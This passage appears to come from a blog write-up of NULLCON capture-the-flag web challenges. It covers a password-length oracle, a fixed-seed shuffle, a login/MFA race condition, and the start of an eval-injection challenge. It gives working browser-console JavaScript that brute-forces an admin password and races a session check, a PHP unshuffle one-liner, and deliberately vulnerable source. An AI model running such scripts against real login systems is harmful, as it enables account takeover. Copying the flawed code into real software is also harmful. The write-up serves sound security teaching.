</span></span><span style="display:flex;"><span>$_SESSION[<span style="color:#e6db74">&#39;flash&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Invalid password, but you got </span><span style="color:#e6db74">{</span>$correct<span style="color:#e6db74">}</span><span style="color:#e6db74"> characters correct!&#34;</span>;
</span></span></code></pre></div><ul>
<li>Meaning: <strong>the login error reveals how many characters of the password are correct (prefix oracle).</strong></li>
</ul>
<hr>
<h2 id="exploit--password-oracle">Exploit ‚Äî Password Oracle</h2>
<p>We can brute-force the admin password one character at a time.</p>
<style>
  .video-container {
    position: relative;
    width: 100%;
    max-width: 800px; /* optional, keeps it from being too wide on desktop */
  }

  .video-container video {
    width: 100%;
    height: auto;
    border-radius: 8px; /* optional styling */
  }
</style>
<div class="video-container">
  <video controls>
    <source src="/posts/CTF/NULLCON/output_10x.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>
<h3 id="steps">Steps</h3>
<ol>
<li>Open <code>/login.php</code>.</li>
<li>Open browser <strong>DevTools ‚Üí Console</strong>.</li>
<li>Paste this JS:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">USER</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>;   <span style="color:#75715e">// target account
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">CHARSET</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@#$%^&amp;*&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">rx</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/got\s+(\d+)\s+characters?\s+correct/i</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">score</span>(<span style="color:#a6e22e">pw</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>({ <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">USER</span>, <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pw</span> }).<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/login.php&#34;</span>, {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span> },
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">body</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;no-store&#34;</span>
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">m</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">match</span>(<span style="color:#a6e22e">rx</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">m</span> <span style="color:#f92672">?</span> parseInt(<span style="color:#a6e22e">m</span>[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">10</span>) <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">found</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ch</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">CHARSET</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">n</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">score</span>(<span style="color:#a6e22e">prefix</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">ch</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">n</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">prefix</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">prefix</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">ch</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] prefix =&#34;</span>, <span style="color:#a6e22e">prefix</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">found</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">found</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">r</span>, <span style="color:#ae81ff">150</span>)); <span style="color:#75715e">// small delay
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;DONE. Admin password =&#34;</span>, <span style="color:#a6e22e">prefix</span>);
</span></span><span style="display:flex;"><span>})();
</span></span></code></pre></div><ol start="4">
<li>This script brute-forces the password character by character and prints the result.</li>
</ol>
<hr>
<h2 id="result">Result</h2>
<pre tabindex="0"><code>ENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!}
</code></pre><!-- ========================================================================================= -->
<hr>
<div id="web-pwgen-100" style="text-align: center;">
  <h1>‚ú®2. Pwgen</h1>
</div>
<img src="/posts/CTF/NULLCON/pwgen.png" style="width:500px;">
<hr>
<p>The site takes the secret flag (a line of letters like F L A G { &hellip; }) and ‚Äúshuffles‚Äù its letters using a machine that needs a starting number called a seed. They always use the same seed, 0x1337, so the shuffle pattern is always the same‚Äîlike repeating the same dance steps each time. When you visit /?nthpw=N, it doesn‚Äôt keep reshuffling the last result; instead, it applies the N-th shuffle pattern from that same machine to the original flag and shows you that scrambled version.</p>
<p>This is weak because a fixed seed makes the pattern predictable, not truly random. If someone knows the seed (or can see it in the source), they can recreate the exact shuffle steps and then reverse those steps to put every letter back in its original place, revealing the real flag.</p>
<hr>
<h2 id="source-highlights">Source highlights</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
</span></span><span style="display:flex;"><span>$shuffle_count <span style="color:#f92672">=</span> <span style="color:#a6e22e">abs</span>(<span style="color:#a6e22e">intval</span>($_GET[<span style="color:#e6db74">&#39;nthpw&#39;</span>]));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">srand</span>(<span style="color:#ae81ff">0x1337</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $shuffle_count; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_shuffle</span>($FLAG); <span style="color:#75715e">// shuffle original each time (RNG advances)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Your password is: &#39;</span><span style="color:#e6db74">$password</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span></code></pre></div><p><strong>Key issues</strong></p>
<ul>
<li>Fixed RNG seed ‚áí predictable ‚Äúrandom‚Äù.</li>
<li>Each iteration shuffles the <strong>original</strong> <code>$FLAG</code> (not the previous result), so the N-th output corresponds to the N-th permutation of the same string.</li>
</ul>
<hr>
<h2 id="steps-i-did">Steps I did</h2>
<ol>
<li>
<p><strong>Fetch a shuffled sample</strong> (picked <code>N=1</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;http://52.59.124.14:5003/?nthpw=1&#39;</span>
</span></span></code></pre></div><p>‚Üí Got a shuffled string.</p>
</li>
</ol>
<hr>
<img src="/posts/CTF/NULLCON/nthpw.png" style="width:1500px;">
<hr>
<ol start="2">
<li>
<p><strong>Recreate the server‚Äôs permutation locally</strong> using the same seed and Fisher‚ÄìYates logic.</p>
</li>
<li>
<p><strong>Invert the permutation</strong> to ‚Äúunshuffle‚Äù the server‚Äôs output back to the original flag.</p>
</li>
</ol>
<hr>
<h2 id="one-liner-used-php">One-liner used (PHP)</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;srand(0x1337); $N=1; $s=&#34;PASTE_SHUFFLED_STRING_HERE&#34;; $L=strlen($s);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">for($k=0;$k&lt;$N;$k++){ $p=range(0,$L-1); for($i=$L-1;$i&gt;0;$i--){ $j=rand(0,$i); [$p[$i],$p[$j]]=[$p[$j],$p[$i]]; } }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$o=array_fill(0,$L,&#34;\0&#34;); for($pos=0;$pos&lt;$L;$pos++){ $o[$p[$pos]]=$s[$pos]; } echo implode(&#34;&#34;,$o),&#34;\n&#34;;&#39;</span>
</span></span></code></pre></div><hr>
<h2 id="why-it-works-short">Why it works (short)</h2>
<ul>
<li>Fixed seed ‚áí same RNG sequence every time.</li>
<li>N-th call to <code>str_shuffle()</code> ‚áí <strong>known</strong> N-th permutation.</li>
<li>Inverting that permutation restores the original index order ‚áí original flag.</li>
</ul>
<hr>
<h2 id="flag">Flag</h2>
<pre tabindex="0"><code>ENO{N3V3r_SHUFFLE_W1TH_STAT1C_S333D_OR_B4D_TH1NGS_WiLL_H4pp3n:-/_0d68ea85d88ba14eb6238776845542cf6fe560936f128404e8c14bd5544636f7}
</code></pre><!-- ========================================================================================= -->
<hr>
<div id="web-webby-203" style="text-align: center;">
  <h1>‚ú®3. Webby</h1>
</div>
<img src="/posts/CTF/NULLCON/webby.png" style="width:500px;">
<hr>
<h2 id="recon-1">Recon</h2>
<h3 id="landing-page">Landing page</h3>
<ul>
<li>
<p>Contains a login form.</p>
</li>
<li>
<p>HTML comments leak test creds and a hint:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- user: user1 / password: user1 --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- user: user2 / password: user2 --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- user: admin / password: admin --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Find me secret here: /?source --&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>user1:user1</code> and <code>user2:user2</code> ‚Üí login succeeds but empty content.</p>
</li>
<li>
<p><code>admin:admin</code> ‚Üí <strong>redirects to <code>/mfa</code></strong> (admin requires MFA).</p>
</li>
<li>
<p>Probing <code>/flag</code> or <code>/secret</code> unauthenticated ‚Üí redirects to <code>/</code> (or ‚Äúnot found‚Äù).</p>
</li>
</ul>
<hr>
<p>Visiting <code>/?source=1</code> dumps the real app (web.py). Key routes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>urls <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;index&#39;</span>, <span style="color:#e6db74">&#39;/mfa&#39;</span>, <span style="color:#e6db74">&#39;mfa&#39;</span>, <span style="color:#e6db74">&#39;/flag&#39;</span>, <span style="color:#e6db74">&#39;flag&#39;</span>, <span style="color:#e6db74">&#39;/logout&#39;</span>, <span style="color:#e6db74">&#39;logout&#39;</span>)
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> web<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>Session(app, web<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>ShelfStore(shelve<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;/tmp/session.shelf&#34;</span>)))
</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/tmp/flag.txt&#34;</span>)<span style="color:#f92672">.</span>read()
</span></span></code></pre></div><h3 id="login-handler-core-flaw">Login handler (core flaw)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">index</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">POST</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ... form validates, creds ok ...</span>
</span></span><span style="display:flex;"><span>        session<span style="color:#f92672">.</span>loggedIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        session<span style="color:#f92672">.</span>username <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>username
</span></span><span style="display:flex;"><span>        session<span style="color:#f92672">.</span>_save()                       <span style="color:#75715e"># (1) loggedIn=True saved</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> check_mfa(session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>, <span style="color:#66d9ef">None</span>)):   <span style="color:#75715e"># admin =&gt; True</span>
</span></span><span style="display:flex;"><span>            session<span style="color:#f92672">.</span>doMFA <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>            session<span style="color:#f92672">.</span>tokenMFA <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(
</span></span><span style="display:flex;"><span>                bcrypt<span style="color:#f92672">.</span>hashpw(str(secrets<span style="color:#f92672">.</span>randbits(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">40</span>,<span style="color:#ae81ff">65</span>)))<span style="color:#f92672">.</span>encode(),
</span></span><span style="display:flex;"><span>                               bcrypt<span style="color:#f92672">.</span>gensalt(<span style="color:#ae81ff">14</span>))
</span></span><span style="display:flex;"><span>            )<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>            session<span style="color:#f92672">.</span>loggedIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            session<span style="color:#f92672">.</span>_save()                   <span style="color:#75715e"># (2) flips back to False</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> web<span style="color:#f92672">.</span>seeother(<span style="color:#e6db74">&#34;/mfa&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render<span style="color:#f92672">.</span>login(session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>,<span style="color:#66d9ef">None</span>))
</span></span></code></pre></div><h3 id="mfa--flag">MFA + Flag</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">mfa</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">POST</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># token must match session.tokenMFA (32 hex); else /logout (kill session)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>token <span style="color:#f92672">!=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;tokenMFA&#34;</span>,<span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> web<span style="color:#f92672">.</span>seeother(<span style="color:#e6db74">&#34;/logout&#34;</span>)
</span></span><span style="display:flex;"><span>        session<span style="color:#f92672">.</span>loggedIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        session<span style="color:#f92672">.</span>_save()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> web<span style="color:#f92672">.</span>seeother(<span style="color:#e6db74">&#39;/flag&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">flag</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GET</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;loggedIn&#34;</span>,<span style="color:#66d9ef">False</span>) <span style="color:#f92672">or</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>,<span style="color:#66d9ef">None</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;admin&#34;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> web<span style="color:#f92672">.</span>seeother(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            session<span style="color:#f92672">.</span>kill()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> render<span style="color:#f92672">.</span>flag(FLAG)
</span></span></code></pre></div><p><strong>Root cause:</strong> During admin login, the app <strong>first</strong> saves <code>loggedIn=True</code> and <strong>later</strong> flips it to <code>False</code> for MFA. Because token generation uses <strong>bcrypt (cost 14)</strong>, there‚Äôs a measurable window between the two saves. Hitting <code>/flag</code> in that window with the <strong>same session id</strong> returns the flag.</p>
<hr>
<h2 id="exploitation">Exploitation</h2>
<h3 id="method-a--browser-console-racer-no-cookie-juggling">Method A ‚Äî <strong>Browser console racer</strong> (no cookie juggling)</h3>
<p>Works because the browser automatically includes the current <code>webpy_session_id</code> (<code>HttpOnly</code>) on both requests.</p>
<p>Open the site, press F12 ‚Üí <strong>Console</strong>, then paste:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// Looks for ENO{...} while racing login vs flag in same session
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>(<span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ms</span> =&gt; <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">ms</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">delays</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">40</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">80</span>,<span style="color:#ae81ff">120</span>,<span style="color:#ae81ff">160</span>,<span style="color:#ae81ff">200</span>]; <span style="color:#75715e">// tweak if needed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 1) Start admin login (do not await -&gt; we want overlap)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/&#34;</span>, {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>},
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;username=admin&amp;password=admin&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span>
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 2) Probe /flag at several offsets during bcrypt work
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">d</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">delays</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#a6e22e">d</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">resp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>, {<span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span>, <span style="color:#a6e22e">cache</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;no-store&#34;</span>});
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">m</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/ENO\{[^}]+\}/</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">m</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;FLAG:&#34;</span>, <span style="color:#a6e22e">m</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">text</span>); <span style="color:#75715e">// whole page if desired
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>})();
</span></span></code></pre></div><p><strong>Result:</strong></p>
<img src="/posts/CTF/NULLCON/webby1.png" style="width:1500px;">
<pre tabindex="0"><code>FLAG: ENO{R4Ces_Ar3_3ver1Wher3_Y3ah!!}
</code></pre><blockquote>
<p>If it doesn‚Äôt pop quickly, re-run or adjust delays (e.g., add 250‚Äì400ms). Don‚Äôt manually navigate to <code>/mfa</code> during the race.</p></blockquote>
<!-- ========================================================================================= -->
<hr>
<div id="web-slasher-275" style="text-align: center;">
  <h1>‚ú®4. Slasher</h1>
</div>
<img src="/posts/CTF/NULLCON/slasher.png" style="width:500px;">
<hr>
<img src="/posts/CTF/NULLCON/slasher1.png" style="width:1500px;">
<hr>
<h2 id="provided-source-key-parts">Provided source (key parts)</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;input&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_scalar</span>($_POST[<span style="color:#e6db74">&#39;input&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $input <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;input&#39;</span>];
</span></span><span style="display:flex;"><span>    $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlentities</span>($input, <span style="color:#a6e22e">ENT_QUOTES</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ENT_SUBSTITUTE</span>, <span style="color:#e6db74">&#39;UTF-8&#39;</span>);
</span></span><span style="display:flex;"><span>    $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($input);
</span></span><span style="display:flex;"><span>    $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">addcslashes</span>($input, <span style="color:#e6db74">&#39;+?&lt;&gt;&amp;v=${}%*:.[]_-0123456789xb `;&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        $output <span style="color:#f92672">=</span> <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$input</span><span style="color:#e6db74">;&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e) {}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">if</span>($output) { <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;div class=&#34;result&#34; id=&#34;resultText&#34;&gt;&lt;?php echo htmlentities($output); ?&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php } ?&gt;
</span></span></span></code></pre></div><h3 id="what-the-filters-do">What the filters do</h3>
<ul>
<li>
<p><code>htmlentities()</code> nukes quotes/HTML meta chars.</p>
</li>
<li>
<p><code>addslashes()</code> escapes <code>\ ' &quot; NUL</code>.</p>
</li>
<li>
<p><code>addcslashes(..., '+?&lt;&gt;&amp;v=${}%*:.[]_-0123456789xb \</code>;)` escapes:</p>
<ul>
